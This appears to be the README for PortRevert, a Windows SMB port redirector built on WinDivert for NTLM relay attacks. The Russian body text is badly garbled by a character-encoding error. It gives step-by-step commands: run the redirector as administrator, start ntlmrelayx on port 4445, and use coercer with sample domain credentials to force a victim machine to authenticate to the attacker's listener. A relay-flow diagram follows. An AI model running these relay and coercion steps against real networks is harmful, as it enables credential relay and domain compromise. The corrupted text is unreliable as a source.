# PortRevert

SMB port redirector for NTLM relay attacks without stopping the LanmanServer service.

## üéØ –û–ø–∏—Å–∞–Ω–∏–µ

–≠—Ç–æ—Ç –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç SMB —Ç—Ä–∞—Ñ–∏–∫ –Ω–∞ –ø–æ—Ä—Ç 445 –∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ—Ç –µ–≥–æ –Ω–∞ –ø–æ—Ä—Ç 4445, –ø–æ–∑–≤–æ–ª—è—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å ntlmrelayx –±–µ–∑ –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ —Å–ª—É–∂–±—ã LanmanServer (–∫–æ—Ç–æ—Ä–∞—è —Å–ª—É—à–∞–µ—Ç –ø–æ—Ä—Ç 445).

## üöÄ –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏

- –ü–µ—Ä–µ—Ö–≤–∞—Ç –≤—Å–µ–≥–æ TCP —Ç—Ä–∞—Ñ–∏–∫–∞ –Ω–∞ –ø–æ—Ä—Ç 445
- –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ –ø–æ—Ä—Ç 4445 –¥–ª—è ntlmrelayx
- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –¥–≤—É–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω–æ–≥–æ —Ç—Ä–∞—Ñ–∏–∫–∞ (–∑–∞–ø—Ä–æ—Å—ã/–æ—Ç–≤–µ—Ç—ã)
- –ö–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è –æ—á–∏—Å—Ç–∫–∞ –¥—Ä–∞–π–≤–µ—Ä–∞ –ø—Ä–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏
- –ü–æ–¥–¥–µ—Ä–∂–∫–∞ –∫–∞–∫ x86, —Ç–∞–∫ –∏ x64 –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä

## üìã –¢—Ä–µ–±–æ–≤–∞–Ω–∏—è

- Windows 8/10/11
- –ü—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
- Visual Studio (–¥–ª—è —Å–±–æ—Ä–∫–∏)
- WinDivert 2.2+

## üõ†Ô∏è –°–±–æ—Ä–∫–∞

1. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ Visual Studio
2. –°–∫–∞—á–∞–π—Ç–µ WinDivert 2.2+ —Å [–æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–æ–≥–æ —Å–∞–π—Ç–∞](https://reqrypt.org/windivert.html)
3. –û—Ç–∫—Ä–æ–π—Ç–µ –ø—Ä–æ–µ–∫—Ç –≤ Visual Studio
4. –ù–∞—Å—Ç—Ä–æ–π—Ç–µ –ø—É—Ç–∏ –∫ –±–∏–±–ª–∏–æ—Ç–µ–∫–∞–º WinDivert
5. –°–æ–±–µ—Ä–∏—Ç–µ –ø—Ä–æ–µ–∫—Ç (Release x64)

## üöÄ –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ

### –ó–∞–ø—É—Å–∫ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è:
```cmd
PortRevert.exe
```
### –í—ã–≥—Ä—É–∑–∫–∞ –¥—Ä–∞–π–≤–µ—Ä–∞:
```cmd
PortRevert.exe uninstall
```
## üéØ –ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –¥–ª—è NTLM relay
### 1. –ó–∞–ø—É—Å—Ç–∏—Ç–µ PortRevert –æ—Ç –∏–º–µ–Ω–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞:
```cmd
PortRevert.exe
```
### 2.  –ó–∞–ø—É—Å—Ç–∏—Ç–µ ntlmrelayx –Ω–∞ –ø–æ—Ä—Ç—É 4445:
```cmd
ntlmrelayx.exe -smb-port 4445 -smb2support -debug
```
### 3. –ü—Ä–∏–Ω—É–¥–∏—Ç–µ –∂–µ—Ä—Ç–≤—É –∫ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –ª—é–±—ã–º —Å–ø–æ—Å–æ–±–æ–º, –Ω–∞–ø—Ä–∏–º–µ—Ä —Å –ø–æ–º–æ—â—å—é coercer:
```zsh
coercer coerce -d cs.org -t dc1 -u test -p 'Password123!' -l pc3 --always-continue

(PortRevert –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –∑–∞–ø—É—â–µ–Ω –Ω–∞ —Ö–æ—Å—Ç–µ-—Å–ª—É—à–∞—Ç–µ–ª–µ, –≤ –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ - pc3)
```
## üîÑ –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç
```
–ñ–µ—Ä—Ç–≤–∞ -> –ü–æ—Ä—Ç 445 
    ‚Üì (–ø–µ—Ä–µ—Ö–≤–∞—Ç PortRedirector)
–ñ–µ—Ä—Ç–≤–∞ -> –ü–æ—Ä—Ç 4445 -> ntlmrelayx
    ‚Üì (–æ—Ç–≤–µ—Ç—ã)
ntlmrelayx -> –ü–æ—Ä—Ç 4445 
    ‚Üì (–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –æ–±—Ä–∞—Ç–Ω–æ)
ntlmrelayx -> –ü–æ—Ä—Ç 445 -> –ñ–µ—Ä—Ç–≤–∞
```

## ‚ö†Ô∏è –í–∞–∂–Ω—ã–µ –∑–∞–º–µ—á–∞–Ω–∏—è
- –¢—Ä–µ–±—É—é—Ç—Å—è –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
- –ù–µ –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —Å–ª—É–∂–±—É LanmanServer
- –†–∞–±–æ—Ç–∞–µ—Ç —Å –≤–Ω–µ—à–Ω–∏–º –∏ –ª–æ–∫–∞–ª—å–Ω—ã–º SMB —Ç—Ä–∞—Ñ–∏–∫–æ–º
- –§–∞–π–ª—ã WinDivert.sys –∏ WinDivert.dll –¥–æ–ª–∂–Ω—ã –Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è —Ä—è–¥–æ–º —Å exe
## üßπ –û—á–∏—Å—Ç–∫–∞

–ü–æ—Å–ª–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –∑–∞–ø—É—Å—Ç–∏—Ç–µ:
```cmd
PortRevert.exe uninstall
```
–≠—Ç–æ –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç –∏ —É–¥–∞–ª–∏—Ç –¥—Ä–∞–π–≤–µ—Ä WinDivert –∏–∑ —Å–∏—Å—Ç–µ–º—ã.
## üìÑ –õ–∏—Ü–µ–Ω–∑–∏—è

–≠—Ç–æ—Ç –ø—Ä–æ–µ–∫—Ç —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω—è–µ—Ç—Å—è –ø–æ –ª–∏—Ü–µ–Ω–∑–∏–∏ MIT.
## üôè –ë–ª–∞–≥–æ–¥–∞—Ä–Ω–æ—Å—Ç–∏

- [WinDivert](https://reqrypt.org/windivert.html) - –∑–∞ –æ—Ç–ª–∏—á–Ω—É—é –±–∏–±–ª–∏–æ—Ç–µ–∫—É –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –ø–∞–∫–µ—Ç–æ–≤
- –°–æ–æ–±—â–µ—Å—Ç–≤—É –ø–µ–Ω—Ç–µ—Å—Ç–∞ –∑–∞ –≤–¥–æ—Ö–Ω–æ–≤–µ–Ω–∏–µ
## üîí –î–∏—Å–∫–ª–µ–π–º–µ—Ä

–≠—Ç–æ—Ç –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω —Ç–æ–ª—å–∫–æ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π –∏ –≤—Å–µ—Ö —Ç–µ—Ö, –∫—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ –æ–±–ª–∞—Å—Ç–∏ –ø–µ–Ω—Ç–µ—Å—Ç–∞ –∏ —ç—Ç–∏—á–Ω–æ–≥–æ —Ö–∞–∫–∏–Ω–≥–∞. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ!
